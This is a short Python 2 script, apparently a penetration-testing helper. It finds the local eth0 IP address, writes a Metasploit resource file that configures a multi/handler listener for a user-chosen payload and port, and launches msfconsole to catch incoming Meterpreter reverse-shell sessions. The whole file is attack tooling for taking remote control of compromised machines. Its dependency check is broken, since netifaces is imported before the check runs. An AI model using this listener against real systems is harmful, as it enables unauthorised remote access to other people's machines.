#!/usr/bin/env python

import netifaces as ni
import subprocess
import os.path
import pkgutil
import sys

def main():

    install = (1 if pkgutil.find_loader("netifaces") else 0)
    if install == 1:
        getIPaddress()
    else:
        cmd = "pip install netifaces"
        subprocess.call(cmd, shell=True)

def getIPaddress():
    print "[+] -- Checking Local IP on eth0"
    ni.ifaddresses('eth0')
    ip = ni.ifaddresses('eth0')[2][0]['addr']
    print "[+] -- IPAddress is %s" %(ip)
    printFile(ip)

def printFile(ip):

    if os.path.isfile('meterpreter.rc'):
        os.remove('meterpreter.rc')

    if len(sys.argv) > 3:
        toFile = "use exploit/multi/handler\nset PAYLOAD "+sys.argv[1]+"\nset LHOST "+ip+"\nset LPORT "+sys.argv[2]+"\n"+sys.argv[3].decode("string_escape")+"\nset ExitOnSession false\nexploit -j -z"
    else:
        toFile = "use exploit/multi/handler\nset PAYLOAD "+sys.argv[1]+"\nset LHOST "+ip+"\nset LPORT "+sys.argv[2]+"\nset ExitOnSession false\nexploit -j -z"
    print "[+] -- Creating Metasploit Script"
    with open('meterpreter.rc', 'a') as f:
        f.write(toFile)

    f.close()
    startMetasploit()

def startMetasploit():

    print "[+] -- Starting Metasploit!"
    cmd = 'msfconsole -r meterpreter.rc'
    subprocess.call(cmd, shell=True)

if __name__=='__main__':
    main()
